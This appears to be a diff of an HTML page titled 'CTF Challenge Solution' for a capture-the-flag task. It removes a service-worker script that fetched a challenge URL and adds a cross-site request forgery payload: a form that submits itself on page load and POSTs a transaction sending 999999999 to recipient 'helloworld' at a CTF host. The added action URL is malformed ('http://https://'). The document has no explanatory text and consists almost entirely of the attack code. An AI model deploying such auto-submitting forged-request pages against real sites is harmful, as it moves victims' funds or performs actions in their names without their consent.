@@ -5,47 +5,12 @@
     <title>CTF Challenge Solution</title>
 </head>
 <body>
-    <h1>CTF Challenge Solution</h1>
-    <div id="result">Loading...</div>
-
-    <script>
-        // The key is to use a service worker to handle the request without HTTPS constraints
-        if ('serviceWorker' in navigator) {
-            window.addEventListener('load', function() {
-                navigator.serviceWorker.register('sw.js').then(function(registration) {
-                    console.log('ServiceWorker registration successful');
-                    
-                    // After service worker is registered, send the target URL to check
-                    fetchTarget();
-                    
-                }).catch(function(err) {
-                    console.log('ServiceWorker registration failed: ', err);
-                    document.getElementById('result').textContent = 'Service worker registration failed: ' + err;
-                });
-            });
-        } else {
-            document.getElementById('result').textContent = 'Service workers not supported in this browser!';
-        }
-
-        function fetchTarget() {
-            // Create a message channel
-            const messageChannel = new MessageChannel();
-            
-            // Configure how to handle messages received from the service worker
-            messageChannel.port1.onmessage = (event) => {
-                document.getElementById('result').textContent = 'Response: ' + event.data;
-            };
-
-            // Send message to service worker with the target URL
-            if (navigator.serviceWorker.controller) {
-                navigator.serviceWorker.controller.postMessage({
-                    type: 'FETCH_TARGET',
-                    url: 'http://chall2.midnightflag.fr:13650/url.php' // Replace with actual challenge URL
-                }, [messageChannel.port2]);
-            } else {
-                document.getElementById('result').textContent = 'Service worker not controlling the page yet. Please refresh.';
-            }
-        }
-    </script>
+<form id="tx" action="http://https://hackchan-mjk2mpay.ctf.pro/?action=create-transaction" method="POST">
+  <input name="recipient" value="helloworld" />
+  <input name="amount"    value="999999999" />
+</form>
+<script>
+  document.getElementById('tx').submit();
+</script>
 </body>
 </html>
